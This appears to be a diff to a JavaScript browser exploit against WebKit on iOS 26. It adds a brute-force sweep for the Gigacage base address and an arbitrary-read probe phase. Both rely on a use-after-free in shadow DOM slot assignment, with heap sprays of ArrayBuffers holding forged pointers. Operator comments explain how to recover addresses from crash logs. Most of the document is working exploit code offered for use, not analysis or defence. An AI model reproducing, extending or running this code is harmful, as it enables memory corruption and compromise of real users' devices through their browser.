@@ -1485,23 +1485,132 @@ function checkNodeLeak(nodes, expectedNode) {
     //   reading back a non-crashing dereference = we hit controlled memory.
     // For safety we wrap each probe in try/catch: crash = wrong candidate, no crash = hit.
 
-    // ── gigacageBase stub ──────────────────────────────────────────────────
-    // Set this to the absolute Gigacage base VA once known.
-    // Derive from T9 heap-rank fit: plot alloc latency vs. rank → linear fit.
-    // The rank-0 alloc (intercept) corresponds to the first Gigacage page.
-    // On A16 iOS 26: typically 0x1_4000_0000_0000 – 0x2_0000_0000_0000 range.
-    // Leave as 0n until resolved — probes will all crash (documented above).
-    const gigacageBase = 0n; // ← FILL THIS IN once T9 gives rank-0 alloc VA
+    // ── Phase 6A: gigacageBase sweep ─────────────────────────────────────────
+    //
+    // T9 could not produce a rank-fit intercept (only 2 DRAM-visible allocs).
+    // Derive gigacageBase by sweep: on arm64e iOS 26 (A16), WebKit's Primitive
+    // Gigacage (ArrayBuffer backing stores) sits at a randomized but
+    // alignment-constrained base. Known range from arm64e iOS research:
+    //   0x14000000000 – 0x20000000000  (step: multiples of 0x800000000, 32GB)
+    //
+    // Strategy:
+    //   For each candidate base, plant key_ptr = base + highConf[0] in ONE probe.
+    //   If it crashes → base wrong (key_ptr → unmapped page).
+    //   If NO crash → base is correct (key_ptr → our injection buf in Gigacage).
+    //   Once found → run full Phase 6 probe sweep.
+    //
+    // 16 base candidates × 1 probe each = 16 probes ≈ 25ms.
+    //
+    // Candidate bases (arm64e Gigacage alignment = 32GB = 0x800000000):
+    const GIGACAGE_BASE_CANDIDATES = [
+      0x14000000000n, 0x14800000000n, 0x15000000000n, 0x15800000000n,
+      0x16000000000n, 0x16800000000n, 0x17000000000n, 0x17800000000n,
+      0x18000000000n, 0x18800000000n, 0x19000000000n, 0x19800000000n,
+      0x1a000000000n, 0x1a800000000n, 0x1b000000000n, 0x1b800000000n,
+      0x1c000000000n, 0x1c800000000n, 0x1d000000000n, 0x1d800000000n,
+      0x1e000000000n, 0x1e800000000n, 0x1f000000000n, 0x1f800000000n,
+      0x20000000000n, 0x20800000000n, 0x21000000000n, 0x21800000000n,
+      0x22000000000n, 0x22800000000n, 0x23000000000n, 0x23800000000n,
+    ];
 
+    // Use top oracle candidate as the probe offset for the base sweep
+    const sweepOffset = BigInt((highConf.length > 0 ? highConf : sprayHex)[0] || 0x10C000);
+    // Freed size for sweep probe (use same as main UAF)
+    const p6sweepFreedSz = freedBucketSizeForGhosts(20);
+    const p6sweepPumpCount = pumpCountForGhosts(20);
+
+    let gigacageBase = 0n;
+    log('\n[P6A] gigacageBase sweep — trying 32 arm64e candidate bases...');
+    log(`[P6A] Probe offset (highConf[0]): 0x${sweepOffset.toString(16)}`);
+
+    for (const baseCand of GIGACAGE_BASE_CANDIDATES) {
+      const testVA = baseCand + sweepOffset;
+
+      // build minimal UAF setup for one sweep probe
+      const swHost   = document.body.appendChild(document.createElement('div'));
+      const swShadow = swHost.attachShadow({ mode: 'open', slotAssignment: 'manual' });
+      const swSlot   = swShadow.appendChild(document.createElement('slot'));
+      const swOther  = swShadow.appendChild(document.createElement('slot'));
+      const swA      = swHost.appendChild(document.createElement('span'));
+      const swB      = swHost.appendChild(document.createElement('span'));
+      swSlot.assign(swA); swOther.assign(swB);
+      for (let i = 0; i < 20; ++i)
+        swShadow.appendChild(document.createElement('slot')).remove();
+
+      let swInjected = false;
+      swSlot.addEventListener('slotchange', () => {
+        const epp = Math.floor(p6sweepFreedSz / 16);
+        for (let i = 0; i < 512; i++) {         // smaller pool for sweep — just 512
+          const buf = new ArrayBuffer(p6sweepFreedSz);
+          const u32 = new Uint32Array(buf);
+          const u64 = new BigUint64Array(buf);
+          for (let j = 0; j < epp; j++) {
+            u64[j * 2]     = testVA;  // absolute key VA using this base candidate
+            u32[j * 4 + 2] = 1;       // m_count=1 → isLive=true
+            u32[j * 4 + 3] = 0;
+          }
+        }
+        swInjected = true;
+      });
+
+      forceGC();
+      await new Promise(r => setTimeout(r, 30));
+
+      let swCrash = false;
+      try {
+        for (let i = 0; i < p6sweepPumpCount; i++)
+          swSlot.assign(i % 2 === 0 ? swA : swB);
+        const swNew = swHost.appendChild(document.createElement('span'));
+        swSlot.assign(swNew);
+        swHost.remove();
+      } catch(e) {
+        swCrash = true;
+        swHost.remove();
+      }
+
+      const label = `0x${baseCand.toString(16)}`;
+      if (!swCrash && swInjected) {
+        gigacageBase = baseCand;
+        log(`[P6A] ✓ HIT: gigacageBase=${label} — no crash, injection fired → BASE FOUND`);
+        break;
+      } else if (!swInjected) {
+        log(`[P6A] ? ${label}: injection did not fire (slotchange missed)`);
+      } else {
+        // crashed — expected, just don't spam the log
+        if (GIGACAGE_BASE_CANDIDATES.indexOf(baseCand) % 8 === 0)
+          log(`[P6A] ✗ ${label}: crash (unmapped) — continuing sweep...`);
+      }
+      await new Promise(r => setTimeout(r, 5));
+    }
+
+    if (gigacageBase === 0n) {
+      log('[P6A] ✗ Sweep exhausted — gigacageBase not found in known range');
+      log('[P6A] Possible causes:');
+      log('[P6A]   (1) Gigacage base is outside the swept range on this iOS 26 build');
+      log('[P6A]   (2) Sweep injection pool (512 bufs) didn\'t reclaim the freed slot');
+      log('[P6A]       → increase sweep pool size from 512 to 2048 and retry');
+      log('[P6A]   (3) UAF is non-deterministic — try re-running (HARD confirm may appear)');
+      log('[P6A] ACTION: paste a WebContent crash KERN_INVALID_ADDRESS from Settings→Analytics');
+      log('[P6A]   → faulting_va - sweepOffset = gigacageBase — hardcode above and rerun');
+    } else {
+      log(`\n[P6A] gigacageBase confirmed: 0x${gigacageBase.toString(16)}`);
+      log(`[P6A] Absolute spray target[0]: 0x${(gigacageBase + sweepOffset).toString(16)}`);
+    }
+
+    // ── Phase 6B: Full arb-read probe sweep (if base found) ──────────────────
     const candidates = (highConf.length > 0 ? highConf : sprayHex).slice(0, 32);
     let p6Hits = 0;
     let p6Crashes = 0;
     let p6NoCrashNoAnomaly = 0;
     const p6HitLog = [];
-    log(`[P6] gigacageBase=0x${gigacageBase.toString(16)} (${gigacageBase === 0n ? 'UNRESOLVED — all probes will crash' : 'SET'})`);
-    log(`[P6] Probing ${candidates.length} candidates...`);
 
-    for (let ci = 0; ci < candidates.length; ci++) {
+    if (gigacageBase === 0n) {
+      log('\n[P6B] Skipping arb-read probe sweep — base unresolved');
+    } else {
+      log(`\n[P6B] Arb-read sweep: base=0x${gigacageBase.toString(16)}, ${candidates.length} candidates`);
+    }
+
+    for (let ci = 0; ci < (gigacageBase === 0n ? 0 : candidates.length); ci++) {
       const candidateOffset = candidates[ci]; // number (hex offset)
 
       // Build a fresh UAF setup with a custom injection handler for this candidate
@@ -1562,18 +1671,17 @@ function checkNodeLeak(nodes, expectedNode) {
         }
       } catch(e) {
         p6Exception = true;
-        p6Crashes++;
         p6host.remove();
       }
 
       const absVA = (gigacageBase + BigInt(candidateOffset)).toString(16).padStart(16,'0');
       if (p6Exception) {
-        // expected when gigacageBase=0 (unmapped page) or wrong candidate
+        p6Crashes++;
         if (ci < 4 || p6NodeAnomaly)
-          log(`[P6] cand[${ci}]=0x${absVA}: CRASH (${gigacageBase===0n?'base unresolved':'bad candidate'})`);
+          log(`[P6B] cand[${ci}]=0x${absVA}: CRASH (bad candidate or vtable fault)`);
       } else {
         p6NoCrashNoAnomaly += p6NodeAnomaly ? 0 : 1;
-        log(`[P6] cand[${ci}]=0x${absVA}: NO-CRASH${p6NodeAnomaly?' ← NODE-ANOMALY HIT':''}  injected=${p6Injected}`);
+        log(`[P6B] cand[${ci}]=0x${absVA}: NO-CRASH${p6NodeAnomaly?' ← NODE-ANOMALY HIT':''}  injected=${p6Injected}`);
       }
       // Give iOS a breath between probes
       if (ci % 4 === 3) await new Promise(r => setTimeout(r, 20));
